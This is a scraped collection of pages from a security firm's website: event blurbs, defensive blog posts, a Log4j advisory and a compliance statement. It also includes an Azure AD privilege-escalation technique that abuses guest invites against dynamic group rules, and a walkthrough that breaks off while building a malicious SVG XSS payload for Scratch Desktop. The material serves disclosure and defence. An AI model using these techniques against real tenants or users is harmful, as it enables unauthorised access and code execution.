However, this time we were able to create unique, world-class detection capabilities.During his presentation, Rafael will guide us through the process he and a cross-departmental team at mnemonic followed to analysed the malware to determine the kind of traffic it generated, identify unique patterns for detection, and finally, combined this knowledge with the power of Argus' detection capabilities to produce (as far as we know) the only general, robust and easy to deploy network detection rule for Industroyer2 in the world.: 3/5: NorwegianCrowdStrike will be providing a strategic-level overview of the main cyber security threats and trends that they have observed over the past 18 months, how nation-state adversaries have adapted their attack techniques, and how the ecosystem of financially-motivated eCrime actors has increased in size, complexity, and specialisation.Additionally, CrowdStrike will illustrate the major threats that they are currently observing in Scandinavia and Europe as a whole, including profiles of the most active adversaries in the region.: 2/5: EnglishMonitoring and protecting endpoints has never been more critical than today. Malicious adversary activity happens around-the-clock and according to CrowdStrike, average breakout time in 2021 was just 1 hour and 24 minutes. Detecting and responding efficiently requires a team with expertise and availability to manage and resolve critical incidents. Rapid response combined with isolation activities are becoming mandatory to keep organisations secure. This session will detail how the Argus Endpoint Responder service helps organisations detect and respond to threats. In this session, mnemonic will also introduce their strategic partnership with CrowdStrike and what benefits the CrowdStrike Falcon adds to the Argus Endpoint Responder service.

{"title": "How to protect your business against social engineering attacks", "ingress": "Social engineering attacks remain a relevant threat. Here are eight countermeasures that can help protect businesses against such attacks.", "content": "This blog post discusses the ongoing relevance of social engineering attacks and provides eight measures for preventing them. These measures include focusing on training and awareness, applying multifactor authentication, having adequate email security, using an updated antivirus, paying attention to updates and patching, promoting security culture, transparency as a measure to prevent new attacks, and making sure relevant policies and procedures are being followed.Social engineering is the art of using manipulation and psychological persuasion to make people compromise information systems. Examples of common social engineering attacks are ,  and  attacks. These attacks use less technical methods than “traditional hackers” to accomplish their goals. Trust, fear and temptation are commonly used tools attackers use to gain access to systems, confidential information, user accounts, or to perform other malicious acts.Even though social engineering attacks are not new, attackers are constantly changing the methods they use and we see that attacks are getting more sophisticated. The number of attempted frauds using social manipulation is constantly increasing, and this type of fraud appears to be the most profitable method for criminals, according to Social engineering attacks are used by both private actors and actors associated with nation states, . Since the 2014 Russian invasion and annexation of the Crimean Peninsula, , where social engineering attacks is one of the attack vectors being utilised.There have been multiple phishing campaigns performed by Russian actors, for instance by the Russia-linked APT SEABORGIUM, who likely supports traditional espionage objectives. Their primary targets are NATO countries, and .  and they use areas of interest to deceive employees, establish contact with them, and gain their trust in order to infiltrate the organisation. Furthermore, there have been  in the targeted organisation and sends out malicious content disguised as a security awareness program.The examples above are just a few of the many ways to encounter social engineering. These attacks are used by various types of threat actors and can take many forms. The following sections outline countermeasures that based on our experience should be taken to prevent and mitigate the impact of social engineering attacks.As attackers develop new methods and scams to trick users, it is important to stay updated and receive regular reminders of how to prevent such attacks. Security training and awareness should be performed on a regular basis to remind employees on best practices as well as the new methods and tools attacker may use. is an important measure to protect against social engineering attacks and it should not be forgotten. If an attacker manages to steal log in credentials like username and password, the attacker will not gain access without the MFA. Using MFA on all systems is therefore a good preventative measure. can prevent malicious scripts to execute. If someone has fallen for a phishing attack by clicking on a link or downloading a harmful attachment, antivirus can prevent further damage and prevent malicious code to run on the laptop. is essential when preventing social engineering attacks, as such attacks often happen over email. Sender Policy Framework (SPF) can prevent domain spoofing, as SPF can specify who can send emails from a domain, preventing attackers to send phishing emails from your business domain. DomainKeys Identified Mail (DKIM) ensures the integrity of the content in emails, ensuring that the content has not been tampered with. Domain-based Message Authentication (DMARC) is an email authentication protocol which extends SPF and DKIM. The purpose of DMARC is to protect from spam, spoofing, phishing and BEC attacks. It allows organisations to publish email authentication practices and specific actions that receiving mail servers should take if authentication fails. clients, software, firmware and browsers are also important to prevent the damage that social engineering attacks can do. Staying up to date will remove known vulnerabilities and close security gaps which can be exploited by attackers.. Having a culture that promotes security and views it as something positive, can impact employees’ perspective and sharpen focus on security and awareness training. By emphasising that information security is important, valued and essential for the organisation’s success, employees will be more inclined to focus on the training and awareness programs, instead of viewing it as a mandatory task that does not require much focus and attention. A culture that focuses on not shaming the individual that clicked on a phishing link, can contribute to employees telling the IT department about falling for the scam immediately, because they are not afraid of being shamed, thus increasing transparency. By waiting a long time to talk about such mistakes attackers will gain more time to achieve their goals. about falling for or stopping a social engineering attack is useful to prevent similar attacks in the future. By sharing information, whether that is within the organisation or sharing with external parties, information sharing will provide others with facts about which methods attackers uses and make it easier to prevent similar attacks. can be effective tools to protect against social engineering attacks. For instance, if a third party wants to change the account number the finance department is transferring money to. To prevent a BEC attack to take advantage of this, a helpful procedure could be that you have to confirm new account numbers on a different channel if the total amount is of a certain value, for instance by double checking over the phone if the request first originated from an email.Social engineering is a field in constant change, and threat actors find new ways to exploit systems and people. Even though social engineering attacks can cause great damage alone, they are also often a gateway for more technical and sophisticated attacks, and it is important that organisations and individuals take appropriate measures to protect themselves. The countermeasures outlined here provide comprehensive protection against social engineering attacks by addressing various aspects, including technical and organisational measures. While some, such as establishing a positive security culture, require more time and effort to implement, all steps outlined can aid in the protection against these types of attacks, thus making your organisation more secure.", "url": "https://www.mnemonic.io/resources/blog/how-to-protect-your-business-against-social-engineering-attacks/", "category": "resources", "subcategory": "blog"},

Proof-of-concept code has been published, and we currently observe internet-wide exploit attempts and scanning for vulnerable servers. Several botnets are already exploiting this vulnerability, and it is being observed used by both crime-oriented and state-sponsored threat actors.A vendor fix is available and highly recommended to apply as soon as possible. A workaround mitigation is described and recommended for systems that cannot be upgraded.Apache Log4j is a widely used logging library for Java applications. On November 24, Alibaba Cloud's security team reported a a zero-day vulnerability in Log4j versions 2.0 to 2.14.1 to Apache.The vulnerability is trivial to exploit, is present in default configurations of a large number of popular enterprise software, and proof-of-concept exploit code was published on the 9th of December. If an attacker is able to get a vulnerable application to log an attacker-supplied input, remote code execution is possible.JNDI (Java Naming and Directory Interface) is a Java programming language API that that allows software clients to discover and look up data and resources. The vulnerability allows an attacker to craft and send a malicious payload containing a JNDI lookup that gets parsed and executed by Log4j. The supplied user input can for example come from a web application that logs user names, referrers or user-agent strings. The vulnerable Log4j code may reside on a system in backend infrastructure that is not directly accessible via the internet. We have observed many cases where the malicious payload contains code with message lookups causing outbound connections through various protocols, effectively creating a backdoor access for remote code execution.A new version of Log4j 2.16.0 is now available, which fixes the vulnerability by removing support for message lookups and disabling JNDI by default.mnemonic is observing both active reconnaissance and exploitation attempts for this vulnerablity.Due to the ease of exploitation and availability of exploit code, we expect evolving techniques and increased number of attempts to exploit this vulnerability. This vulnerability is currently being exploited by both crime-oriented and state-sponsored threat actors.The consequences of a successful exploitation could be both in the form of remote code execution and data leaks.The mass scanning activity observed so far has involved attempts at installing several cryptocurrency miners and the Tsunami backdoor. The Mirai botnet was very quick to adopt the exploit as part of its functionality. Mass scanning and concurrent exploit attempts are targeting both Windows and Linux systems. Data leaks attempts without dropping a payload is also part of the mass scanning activity. The vulnerability is also being leveraged by initial access brokers that operate a business model where they sell their access to vulnerable targets to ransomware-as-a-service operators.Software applications utilising Apache Log4j 2 versions 2.0 to 2.14.1 are vulnerable.Log4j versions 1.x are not affected by this vulnerability, however these reached end of life in 2015 and are affected by several other security vulnerabilities.Apache released an initial fix, 2.15.0rc1 which security researchers were able to bypass. Following this, Apache released 2.15.0rc2, which fixed these issues. However, on 14. December a new vulnerability CVE-2021-45046 was discovered for certain non-default configurations of the 2.15.0 fixes that enable an attacker to craft malicious input data using a JNDI Lookup pattern resulting in a denial of service attack. This issue can be mitigated in prior releases (<2.16.0) by removing the JndiLookup class from the classpath.mnemonic recommends that you perform the following actions:Please note that there are several obfuscation techniques in use by attackers that might make searching for exploit patterns difficult. Mass scanning has been observed since the 9th of December, but some exploitation attempts have been reported as early as 1st of December. Threat hunting activities is therefore recommended on historical log data.mnemonic  recommends to assume compromise and to initiate incident response activities if any anomalies are discovered on a device running vulnerable versions of Log4j.We are continuously monitoring the situation and will develop and implement detection as soon as new patterns and indicators are identified for any given Argus service.If you need any assistance in how to apply any of these measures, please open an Argus ticket or reach out to your Sales contact in mnemonic.", "url": "https://www.mnemonic.io/resources/blog/threat-advisory-apache-log4j-remote-code-execution-vulnerability/", "category": "resources", "subcategory": "blog"},

The document emphasises our commitment to respect internationally recognised labour and human rights, our work in the fight against corruption and money laundering, and our focus on the environment and sustainability.On 1 July 2022, the Transparency Act came into force. In mnemonic, we have established processes and routines for conducting due diligence assessments, for both of our suppliers and our business partners. The method and follow-up for due diligence are incorporated into our management system for Quality (ISO9001) and information security (ISO27001). Risk assessments are central when we evaluate the risks, and consequences, of violating decent working conditions and human rights - in our operations and our supply chain. This Statement is valid for the period 1 July 2022 to 31 December 2022.Based on our due diligence assessments, there is limited risk in our operations of negatively impacting fundamental human rights and decent labour conditions.Through systematic risk assessments, we have identified that the greatest risks relate to the procurement of products for resale or products and services for our own use (including transportation), as well as the hiring of personnel. The identified risks are documented in our management system and assessed based on the current situation and after implemented measures.The risk of negatively impacting fundamental human rights or decent working conditions at mnemonic is considered to be very low. Competent, satisfied and committed employees are our most important resource, and we emphasis trust-based management, autonomy and high professional integrity.The majority of shares in mnemonic are owned by the employees, which provides a unique opportunity to optimise working conditions in the company. We have a good and inclusive working environment that is reflected in high employee satisfaction, with a very low \"turnover\" rate of approx. 4%. mnemonic was also named Norway's best workplace by Great Place to Work in both 2022 and 2023.Our management system for information security and quality has been ISO certified since 2005 and 2013 respectively, with annual audits. This means that the Transparency Act and our identified measures are incorporated into an already well-functioning and well-established system. All systematic follow-up of the measures mentioned is documented in procedures and implemented in our management system, and controls are carried out through annual internal and external audits. If blameworthy conditions and/or breaches related to decent working conditions and human rights are identified, these are registered and followed up in our internal case management tool.To minimise any negative impact of the identified risks, measures have been implemented in our procedures for evaluating all active suppliers and business partners who supply products/services for resale and for internal use.We require all new and existing suppliers that we use for resale of solutions and services to document decent working conditions and human rights. This is to prevent any breaches of decent working conditions and human rights. Based on the findings from our risk assessment, we place particular emphasis on the evaluation of potential negative impacts on human rights and decent working conditions at our suppliers of transport services, craftsman services and cleaning services for internal use.If we are unsure about how suppliers and business partners impact the outside world, we require them to provide a statement and documentation, or to commit to our Code of Conduct through the use of the Supplier Code of Conduct. Suppliers and business partners also undergo a recurring evaluation for compliance. If they cannot document satisfactory compliance with basic human rights and decent working conditions, this may have consequences for the contractual relationship with mnemonic.mnemonic is particularly vigilant and will avoid cooperation with suppliers and business partners operating from countries where there is an increased risk of human rights and decent labour conditions violations.In normal cases, we will first try to influence the supplier to minimise the risk and repair any violations that have been committed. If it is discovered that mnemonic purchases goods or services from suppliers that have or may have a negative impact on human rights and decent working conditions, this shall be registered in our internal case management system for further follow-up. Management must also be notified, so that mnemonic can implement the necessary measures to limit negative consequences and possibly contribute to redress or compensation for those concerned.The measures introduced have helped to reduce the risk to a low level.The Board of Directors of mnemonic has adopted our policy for the Transparency Act, and given the CEO of mnemonic AS the responsibility to comply with it.If you would like further information, please contact mnemonic by sending an enquiry to .", "url": "https://www.mnemonic.io/legal/due-diligence-assessment/", "category": "legal", "subcategory": "due-diligence-assessment"},

This is something I wanted to be involved in”, he says.“Coming from the provider side of things, I see a huge benefit with different providers and customers alike using the same standard frameworks and assessments in cloud environments. This leads us to a common and better understanding of each other, and ultimately to a better overview of the status of cloud security on national levels and worldwide.”He also has advice for those feeling unsure about security when moving their organisation into cloud environments:“Though it might seem overwhelming at first, companies can use the cloud opportunity to improve their security posture and general security maturity. Security is not a roadblock when it comes to the cloud, rather it can be an opportunity. The CSA can be of great help here. I’ve observed that our employees have benefitted significantly from attending CSA seminars and taking certifications such as CCSK and CCSP.”Angel Alonso will be presenting on cloud security in mnemonic’s next breakfast seminar on the 14th of May.

Organizations that employ dynamic groups for assigning user roles and rights should review their Azure Active Directory configuration to ensure they are not susceptible to this attack.", "content": "mnemonic researchers have discovered a new technique for escalating privileges within Azure environments through the abuse of dynamic groups in Azure Active Directory. Organizations that employ dynamic groups for assigning user roles and rights should review their Azure Active Directory configuration to ensure they are not susceptible to this attack.As organizations continue to migrate parts or all of their infrastructure to the cloud, security personnel need to adapt and understand the threats related to this cloud transition. At first glance, this doesn’t appear all too complicated, and security teams can take similar approaches to networking security as they have in traditional on-premise networks: VPNs for connectivity, network segmentation, network security appliances, agents, hardened virtual machines, etc. While these are all valid security measures for cloud infrastructure, they don’t address security concerns related to the management of infrastructure and users in the cloud.For example, consider an adversary that is targeting a VM on an internal Azure network. The adversary cannot gain network access to the private Azure VNet that the VM resides on, but finds the password to an account in Azure AD. If the compromised user account has access to modify the infrastructure within Azure, they can bypass network and host-level security controls. The adversary could simply update the VM so that they may access it, or directly execute code on it. This scenario is shown below:This is a very simple example of pivoting into infrastructure through Azure’s “management plane”, which is used by legitimate users to manage infrastructure. This scenario is dependent on an adversary compromising an account in AAD that has privileges to run commands on VMs within the Azure infrastructure.This may seem like a somewhat naïve and simple example given the requirement for a pre-compromised AAD account with special permissions in Azure. However, commonly successful techniques such as phishing, password cracking or identification of leaked secrets can lead to the compromise of an AAD account. If an account compromised using one of those techniques does not have administrative permissions, then the goal of the adversary is to identify some privileged escalation that helps them gain higher permissions.The remainder of this blog post focuses on the topic of elevating privileges in Azure infrastructure with a previously compromised Azure AD account. A full summary of previous work on this topic will be contained in a future post, whereas this post will focus on a new technique targeting AAD dynamic groups.Let’s start by clearing the air about Azure vs Azure Active Directory (Azure AD or AAD).When we talk about Azure, many folks jump straight to thinking about Azure Active Directory, or even Office 365. This is a common point of confusion. Microsoft has a large cloud ecosystem that is tied together with identity management and authentication through Azure Active Directory.Azure Active Directory uses “tenants” to represent different organizations and environments within a company’s Microsoft cloud ecosystem, and includes a collection of users, groups and rights. Any one tenant may be connected to a single Office365 account, any number of Azure subscriptions, Dynamics365, Outlook, and other Microsoft cloud services.So while the same Azure AD users may be used for all of these services, Azure AD is  a part of Azure nor a part of Office 365. Azure AD is a separate entity that handles user management and authentication, and has tight integrations with other Microsoft services.With this straight, let’s briefly cover a few other basic topics that are relevant for the privilege escalation technique.Roles in Azure AD are top-level roles in the Microsoft Azure AD tenant for Azure AD users. At the time of writing this article, the assignment of some admin roles to Service Principal objects is also in preview. Azure AD roles allow users or service principals to perform actions including, but not limited, to:The following screenshot illustrates some of these Azure AD Roles in Azure Portal:Azure RBAC (role-based access control) roles govern access to the infrastructure deployed within Azure. This is a large and complicated topic, but the important thing to understand here is that RBAC roles determine what actions an Azure AD principal can take on specific resources deployed in Azure. For example, to deploy a VM, a user must be assigned an RBAC role that includes that action, such as owner or contributor.In Azure AD, users can be added into logical groups to help with user and access management. Azure RBAC roles and Azure AD roles can then be assigned to these groups (Azure AD role assignments to groups is in preview at the time of writing). This means that any user that is added to a group will then inherit the roles assigned to that group.While researching and testing Azure deployments, I stumbled upon an interesting privilege escalation vector: the abuse of dynamic groups in Azure AD.Dynamic groups in Azure AD allow administrators to automatically assign group memberships to users based on attributes of that user. For example, if a company has two offices in Oslo and London, they may create security groups for each of their offices. They can use dynamic groups based on the user’s “city” attribute for this purpose, so that whenever a new user is added to Azure AD, they will automatically be added to one of these two groups.The following picture shows how you would do this with a dynamic group rule:This use case is fairly innocent. But let’s think of a more security sensitive case.An organization creates a dynamic group called VM Contributors, which has VM Contributor Access scoped to the subscription:Now, this organization outsources all VM management to a company called “Bluefish”, and Bluefish uses the following naming convention:To automate the process of Bluefish users being assigned VM Contributor, a rule is added to dynamically add any user with “bluefish” in the userPrincipalName (UPN) to the VM Contributor group. Seems reasonable and innocuous, since users cannot modify their UPN without appropriate access rights, and the organization has locked these down.Let’s assume for our scenario that an adversary gains access to a low-privileged user in Azure AD, which resides in no groups or Azure RBAC roles. The compromised user has the “Global Reader” role, so the attacker can read configurations in the directory, but cannot change settings, and therefore cannot use traditional methods to change access rights to their own user, or to other users.The attacker finds the dynamic membership rule, and wants to find a way to trigger the dynamic rule for an account they control. In short, the attacker needs to get the name “bluefish” in the UPN attribute of their user:Since users with the Global Reader role cannot edit any configurations, the attacker cannot edit their own UPN and is stuck.User Principal Names are based on user email addresses. I have identified dynamic groups based on this attribute in the past, and on the surface seems to be okay because users generally cannot change their own email addresses. This requires administrative privileges within Azure AD and a role such as “User Administrator”. However, there is a way around this…By default, users in Azure AD can invite guest users to the directory. Since the UPN of a guest user is still based on email addresses, an adversary can simply create a new email address from any email provider, such as Gmail, that contains “bluefish” in the address. For example:If the attacker invites this email to the azure tenant:And then accepts the invite, the user will become a user in the local directory with an interesting UPN:Now we can go into the portal and check our group assignments:Now the attacker has access to the testDynamicGroup, which assigns the VM contributor role through a dynamic group membership.To summarize:In this example, we show how dynamic groups based on a UPN can be abused using a guest account. However, there are many other attributes for determining dynamic group membership, and different types of attackers could abuse each. The following are other potential attack paths to modify user attributes on dynamic groups:If your Azure tenant uses dynamic groups for security sensitive use cases in Azure AD, it may be worth looking into your group membership rules. The root cause of this type of attack is the ability of an adversary to spoof or tamper with the attributes used by dynamic group membership rules. A basic guideline for preventing this may include:Additionally, related to the specific technique discussed in this article:While this is not the root cause of this issue, it is still best practice to disable this functionality for all users in Azure ADWhile dynamic groups are powerful tools for Azure Administrators, they also present an interesting and perhaps easy to overlook attack vector. Based purely on heuristics, I have seen an uptick in the use of dynamic groups during my security assessments, and I suspect that this trend will continue as Azure deployments grow and become more complicated to manage.", "url": "https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/", "category": "resources", "subcategory": "blog"},

{"title": "Quishing: Mitigating QR code phishing threats via email systems", "ingress": "How implementing a few security measures can shield your organisation from QR code phishing attacks through email systems", "content": "Quishing, also referred to as QR code phishing, have been prevalent in the realm of phishing for several years now. The use of QR codes in phishing attacks became prominent around 2019 and the techniques and tactics used have continued to evolve since then.In January 2022, . The perpetrators exploit this technique to redirect unsuspecting victims to fraudulent websites aimed at stealing their login credentials and financial information.There is a noticeable rise in phishing emails that exploit QR codes, bypassing email protections, and it is important for organisations to fully grasp the risks associated with these attacks. This article explores the growing prevalence of QR code phishing attacks and offers valuable tips and recommendations for organisations to mitigate this emerging threat.Phishing attacks exploit human vulnerabilities to gain unauthorised access to sensitive information or networks. QR code phishing attacks involve the use of malicious QR codes that, when scanned, redirect users to fraudulent websites or prompt them to download malicious content. These attacks leverage the widespread adoption of smartphones equipped with QR code scanning capabilities, making it easier for attackers to target a large user base.One factor contributing to the rise of QR code phishing attacks is the increasing popularity of QR codes in various aspects of daily life. They can be found on product packaging, promotional materials, event tickets, and even restaurant menus. This ubiquity makes it more challenging for individuals to distinguish between legitimate and malicious QR codes, increasing the chances of falling victim to phishing attempts.QR code phishing attacks pose a significant challenge for email security systems. Both when it comes to detecting and blocking malicious content effectively.Traditional email filters primarily rely on link analysis and content scanning techniques to identify and block malicious URLs. However, QR codes act as a camouflage for these URLs, making it difficult for automated filters to detect their true intent. As a result, organisations face an increased risk of phishing emails bypassing their security defenses, potentially leading to data breaches or compromises.Another critical concern associated with QR code phishing attacks is the difficulty in tracking and attributing the actions of individuals who interact with these malicious links. When users scan QR codes, they often do so on their personal devices that communicate out-of-band, making it challenging for organisations to identify the individuals who fell victim to the attack.Most organisations will benefit from adopting proactive measures to protect themselves against QR code phishing attacks. Here are a few tips and recommendations that have been successful in the organisations I’ve worked with:Organisations should prioritise comprehensive security awareness and phishing training programs for all employees. By educating staff about the risks associated with QR codes and teaching them how to identify phishing attempts, organisations can significantly reduce the likelihood of successful attacks.By offering add-ins in your employees’ Outlook application you’ll allow users to report suspicious or potentially malicious emails directly from their inbox to the organisation's security team for further analysis and action. By involving users in the process of identifying and reporting potential threats this type of add-in helps to enhance the security of the organisation's email environment.To enhance email security, organisations should consider implementing advanced threat detection solutions that go beyond traditional link analysis. Artificial intelligence and machine learning-powered technologies can help identify suspicious patterns and behaviors associated with phishing attacks, even when disguised as QR codes. In addition, organisations should consider incorporating add-in or integrated tools for scanning QR codes.Implementing policies with enforced device trust requirements will ensure that only trusted and secure devices are allowed to access corporate resources. This helps mitigate the risk of compromised users who got their credentials leaked through QR code phishing attacks.By enforcing MFA (or 2FA - two-factor authentication) when accessing sensitive systems or resources, organisations can add an extra layer of security. This measure can help prevent unauthorised access, even if an individual inadvertently interacts with a phishing link.Before scanning any QR code, individuals should exercise caution and verify its source. It is advisable to use reputable QR code scanning applications that have built-in security features to detect potentially malicious codes.Establish clear policies and guidelines regarding QR code scanning within the organisation. Encourage employees to avoid scanning QR codes from untrusted sources or unknown origins. Consider implementing a formal approval process for scanning QR codes related to business activities.Branding QR codes provides organisations with an additional advantage in identifying broader phishing campaigns where non-branded QR codes are used. By establishing a recognisable brand presence, organisations can easily differentiate their legitimate QR codes from unauthorised ones.Organisations should establish robust incident response plans to address phishing incidents swiftly. Additionally, deploying advanced tracking mechanisms, such as user activity monitoring and endpoint security solutions, can aid in identifying and containing any potential compromises resulting from QR code phishing attacks.Promote best practices for mobile device security, as QR code scanning typically occurs on smartphones or tablets. Encourage employees to keep their devices up to date with the latest operating system and security patches.Organisations should recognise the growing prevalence of QR code phishing attacks via email systems, and take proactive steps to protect themselves and their employees. These attacks pose significant challenges to email security systems, as QR codes can disguise malicious URLs and make it difficult to trace the actions of individuals interacting with them. By implementing a combination of the suggestions above, organisations can enhance their security posture and effectively combat QR code phishing attacks, safeguarding their valuable information, and maintaining the trust of their stakeholders.", "url": "https://www.mnemonic.io/resources/blog/quishing-mitigating-qr-code-phishing-threats-via-email-systems/", "category": "resources", "subcategory": "blog"},

We’ve been pioneering the field, and continue to represent innovation within the service category,” he states.The Market Guide highlights the importance of having human analysts involved in an MDR service and not leaning on automation/artificial intelligence alone. The report states:“The key value proposition of MDR is the human interpretation of security incidents, providing guidance, as well as performing the initial mitigation steps, that would otherwise be complex to understand and enact. By providing context-led investigation, analysis and threat validation (and taking action to disrupt or contain an attack), the MDR provider can buy time for the customer to perform further investigation and ultimately remediate discovered issues utilizing their internal standardized response processes.”Løkken agrees that MDR needs human analysts to add necessary context onto the service for the receiving customer:“In mnemonic, we have long believed that the true value of MDR comes from the human augmentation security experts add to the delivery. Our experience being one of the largest high-touch MDR provider in Europe is that the service needs to utilise leading and innovative technology, but with human-driven SOC functions adding a vital contextual layer onto the service,” he states. Learn more about", "url": "https://www.mnemonic.io/company/whats-new/2023/mnemonic-recognised-by-gartner-market-guide-for-mdr/", "category": "company", "subcategory": "whats-new"},

It is commonly used as an educational tool for students to create games, animations and stories.A vulnerability existed in Scratch and Scratch Desktop versions prior to v.3.17.1 that an attacker could exploit to execute arbitrary code. The exploit utilises a maliciously crafted SVG file that grants an attacker full control of Scratch’s code and GUI, and enables us to launch arbitrary executables on the system if running on Scratch Desktop.Using Scratch as a practical example, this post will demonstrate why you shouldn’t open or download files from untrusted parties, even for a seemingly innocent program such as Scratch. It will also show some of the security pitfalls of the SVG file format. is an open-source  developed programming language and tool for block-based visual programming. It is primarily made for children between the age of 8-16, but enables anyone to easily create interactive stories, games and animations.Schools and educational institutions use Scratch as an introduction to algorithmic and creative thinking, as Scratch's intuitive user interface makes it a good tool to start learning programming. You can start using the tool right away from , host it yourself or download and use their .I recently came across a known security vulnerability in Scratch's SVG rendering engine that was disclosed on Scratch's official forums on October 21st 2020 by the forum user .  describes a  vulnerability with the  (CVE) ID of .Curious as I am, I immediately started looking for public exploits using common search engines and the . Though I couldn’t find one, the forum post does link to the  while  mentions the vulnerable functions and provides a link to the  for the patch. Armed with this information it shouldn't be too hard to create an exploit for the vulnerability.My main motivation for publishing this information is to raise awareness. The following post demonstrates that you must never download and open files from untrusted parties, even for innocent programs such as Scratch. Developers should also beware the security pitfalls of the SVG file format.A patch for the exploited vulnerability was released more than seven months ago making it less likely to be abused today. On that note, I would like to add a reminder to always make sure you keep your software up to date with the latest security patches and be careful with files of unknown origin.Some very basic knowledge on the  (SVG) file format is required to understand this exploit.SVG is a text based file format for computer graphics based on  (XML) that is widely used within the Scratch environment. While more traditional image formats like  or  consist of binary data, SVG is , which means that the file itself consists of human readable text.If you download the mnemonic logo from our webpage and open the file in a text editor, you reveal its true content:Modifying the content (right) in your text editor will change how your web browser will render the logo (left). Altering one of the color codes will change some color in the rendered image.But what makes the SVG file format potentially dangerous? The answer is perhaps surprising - SVG files can contain ,  and load external content. A true security nightmare if you don't tread carefully.You can add the following snippet to the SVG file above in order to display a popup alert when rendering the image:Uploading similar \"malicious\" SVG files to web-based solutions that do not properly sanitise and validate the SVG contents may cause security issues in web-based applications.Scratch has its own  and the vulnerability we exploit resides within this component of Scratch. (JS) is considered one the core technologies of modern web sites. It's a  scripting language that enables dynamic functionality in web sites. Most modern web sites rely on JavaScript and disabling support for JavaScript in your web browser will likely leave you with a poor browsing experience.JavaScript is powerful as it can alter the contents of the current web page, perform generic computation and communicate with third-parties. In other words; control JavaScript and you control the user's entire experience. vulnerabilities enable attackers to inject and execute arbitrary client-side JavaScript in to web pages accessible by other users. For example by uploading our modified SVG image above to a third party website and making the “Game over” popup appear after loading the image. You then have an XSS proof of concept attack.The innocent  can potentially be replaced with any JavaScript you want. For example a key logger, a site redirector or any arbitrary functionality. Imagine a social media platform with a XSS vulnerability; a threat actor that has managed to inject a JS payload may eavesdrop on all you and your friends posts and perhaps perform actions on your behalf.XSS can also be user together with tools such as  (BeEF) to trick users into downloading malicious executables and compromise their clients.The first thing you need to explore a vulnerability is a copy of the vulnerable target. Ideally, a local copy so you can do what you want without interfering with live solutions.A friendly reminder:  attempt to exploit a third party's system(s) without getting a written approval in advance, or you may face legal consequences.The official Scratch website does not include a complete list of previous versions, so cherry picking a vulnerable desktop version prior to 3.17.1 requires a bit more effort. You can grab the source code of a specific release (tag) from the  and build it yourself. Or you can do as I did and guess the download URL of a previous version that still seems to be active.You can download . If this link stops working, try the  instead. Browsing the Web Archive for other vulnerable versions may also be a feasible approach. The  of the linked executable should be:The last step is to install the software. Remember that this is outdated and vulnerable software, so you should never install it on personal or business critical systems; doing so will put your equipment and data at risk. I recommend installing it in an isolated environment, like a virtual machine (VM) or some other virtualised environment.I prefer to save time if I can, so my initial idea was to upload our modified SVG above and hope that I hit the vulnerable code path:I expected to see the same alert pop-up that we saw earlier. Unfortunately, no dice! Seems like we have to dig into the source code. mentions the functions  and  in Scratch's SVG renderer. Looking at the  indicates that the vulnerability lays within  on line 372. We need to somehow manipulate our SVG file into hitting this vulnerable code path and execute our payload.Let's download this source code repository and investigate the source prior to the patch.

Note that you can search within git log using forward slash (/). Commit , which is two commits earlier, seems like a good candidate as there's no SVG sanitisation in the commit contents.mnemonic@scratch-vm MINGW64 ~$ git checkout '16974b462c0'...HEAD is now at 16974b4 Add empty onFinish callbackOpening the file and looking at the contents and surrounding comments of the vulnerable  function, I notice that the function itself seems to be some sort of code \"hack\" to retrieve the true measurements of the loaded SVG. The source code (blindly) clones the SVG, appends it to the document body (\"display window\"), retrieves its measurements and removes the clone from the document body:_transformMeasurements () {...const svgSpot = document.createElement('span');....let bbox;try {// Take the bounding box.bbox = tempTag.getBBox();} finally {// Always destroy the element, even if, for example, getBBox throws.svgSpot.removeChild(tempTag);...The code looks vulnerable upon first sight and Mozilla's documentation on  indicates that the SVG is cloned as is, without being sanitised. Our previous attempt at exploitation did not hit this code, as nothing happened upon loading our malicious SVG.We need to figure out how to reach this code path by looking for code that calls the  function. Searching the source code with  for Windows:mnemonic@scratch-vm MINGW64 ~/scratch-svg-renderer ((16974b4...))$ grep -riIn '_transformMeasurements' ./*./src/svg-renderer.js:104: this._transformMeasurements();./src/svg-renderer.js:109: this._transformMeasurements();./src/svg-renderer.js:360: _transformMeasurements () {We can see that the function is called on line 104 and 109 in . These calls are both within the  function, which is also mentioned by . Let's dig into this function:loadString (svgString, fromVersion2) {...const parser = new DOMParser();svgString = fixupSvgString(svgString);this._svgDom = parser.parseFromString(svgString, 'text/xml');...this._svgTag = this._svgDom.documentElement;...// Transform all text elements.this._transformText();// Transform measurements.// Fix stroke roundedness.this._setGradientStrokeRoundedness();// Renderer expects a view box.} else if (!this._svgTag.getAttribute('width') || !this._svgTag.getAttribute('height')) {...One of two conditions needs to be met in order for the vulnerable  function to be called. The first condition, i, is true if the  variable contains a value that evaluates to . This variable is externally provided to the function and is difficult to determine how to control at this point.The second condition is more promising; . Notice the exclamation mark (!), which means  in JavaScript. The  reverses the result of the preceding statement, which checks for the presence of the  attribute in the initial  tag of the file.The condition can be written in English as . This is interesting!Looking at the content of our previously modified SVG, we notice that the  attribute is clearly present:<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" ><script>alert('Game over!');</script><defs>...It's immediately tempting to remove the attribute from the file and retry our payload, but if you looked clearly at the code above you may have noticed the  and call to . I suspect our trivial payload may be sanitised by these.I read the  and ran some local JavaScript experiments using the console of the embedded  in my browser to verify that this function only converts a text string to HTML DOM elements, not tinkering with our payload.However, the  function residing in  removes our script content from the SVG:module.exports = function (svgString) {...// Empty script tags and javascript executingreturn svgString;};Event handlers to the rescueSo, how can we execute arbitrary JavaScript within our malicious SVG when script contents are stripped?The answer is through . SVGs can contain  tags to include external raster images. This tag supports the  and  event handlers, among others. We can use this to change our payload to the following:<image href=\"http://127.0.0.1:8765/doesNotExist.png\" onerror=\"alert('Pwned by mnemonic!')\" />The snippet attempts to load a picture () from a web server hopefully not running on your local machine () at port . The intention is to make this load operation fail, so that the malicious  event handler is triggered, executing our arbitrary JavaScript code.Our entire SVG file will then look like this:<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image href=\"http://127.0.0.1:8765/doesNotExist.jpg\" onerror=\"alert('Pwned by mnemonic!')\" /><defs><style>.cls-1{fill:#e6e7e8;}.cls-2{fill:url(#linear-gradient);}.cls-3{fill:url(#linear-gradient-2);}</style><linearGradient id=\"linear-gradient\" x1=\"118.41\" y1=\"2.81\" x2=\"124.17\" y2=\"8.57\" gradientUnits=\"userSpaceOnUse\"><stop 